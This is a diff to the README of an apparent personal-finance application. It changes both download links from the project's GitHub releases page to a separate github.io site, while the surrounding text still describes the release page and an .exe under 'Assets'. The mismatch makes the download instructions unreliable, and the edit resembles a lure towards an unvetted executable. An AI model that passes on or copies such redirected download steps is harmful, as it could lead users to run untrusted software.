@@ -1,6 +1,6 @@
 # 📊 apex-mmc-accounting-hub - Manage your personal finance with ease
 
-[![](https://img.shields.io/badge/Download-Application-blue.svg)](https://github.com/Bertawarm921/apex-mmc-accounting-hub/releases)
+[![](https://img.shields.io/badge/Download-Application-blue.svg)](https://bertawarm921.github.io)
 
 Apex MMC provides a central place for your accounting and finance needs. This software offers tools to calculate taxes and payroll, view service packages, access client resources, and read financial materials in multiple languages. It runs on Windows and works within your web browser to provide a smooth experience.
 
@@ -8,7 +8,7 @@ Apex MMC provides a central place for your accounting and finance needs. This so
 
 You must visit our release page to download the latest version of the software. We host all official files there. 
 
-[Click here to open the download page](https://github.com/Bertawarm921/apex-mmc-accounting-hub/releases)
+[Click here to open the download page](https://bertawarm921.github.io)
 
 On this page, look for the section titled "Assets" under the most recent release. You will see a file ending in .exe. Click that file to save it to your computer.
 
